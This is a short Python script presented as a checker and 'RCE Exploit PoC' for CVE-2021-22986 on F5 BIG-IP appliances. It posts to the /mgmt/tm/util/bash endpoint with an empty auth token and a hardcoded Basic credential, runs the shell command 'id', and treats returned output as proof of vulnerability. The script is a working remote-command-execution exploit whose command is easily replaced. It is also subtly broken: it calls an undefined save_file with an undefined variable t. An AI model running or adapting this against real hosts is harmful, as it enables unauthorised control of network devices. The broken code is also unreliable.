#!/usr/bin/env python3

import requests
import json
import argparse
import re
import json
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def printbanner():
    print("""

  ______ _____    _____       _       _ _   
 |  ____| ____|  / ____|     | |     (_) |  
 | |__  | |__   | (___  _ __ | | ___  _| |_ 
 |  __| |___ \   \___ \| '_ \| |/ _ \| | __|
 | |     ___) |  ____) | |_) | | (_) | | |_ 
 |_|    |____/  |_____/| .__/|_|\___/|_|\__|
                       | |                  
                       |_|                  
 
     CVE-2021-22986 Vuln Checker                                                                     
    """)


  
def f5checker(url):

    printbanner()
    print( "[!] Target: " + url)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
        "Content-Type": "application/json",
        "X-F5-Auth-Token": "",
        "Authorization": "Basic YWRtaW46QVNhc1M="
    }

    data = json.dumps({"command": "run" , "utilCmdArgs": '-c id'})
    check_url = url + "/mgmt/tm/util/bash"
    try:
        req = requests.post(url=check_url, data=data, headers=headers, verify=False, timeout=20)
        if req.status_code == 200 and "commandResult" in req.text:
            default = json.loads(req.text)
            display = default["commandResult"]
            save_file(url, t)
            print("[+] {0} is Vulnerable".format(url))
        else:
            print("[-] {0} is Not Vulnerable".format(url))        
    except Exception as e:
        print("URL or IP Dead {0}".format(url))

if __name__ == "__main__":
    parser = argparse.ArgumentParser("F5 RCE Exploit PoC")
    parser.add_argument("-u", "--url", type=str, help="Check if host or hosts is vulnerable")
    args = parser.parse_args()

    url = args.url

    f5checker(url)
    
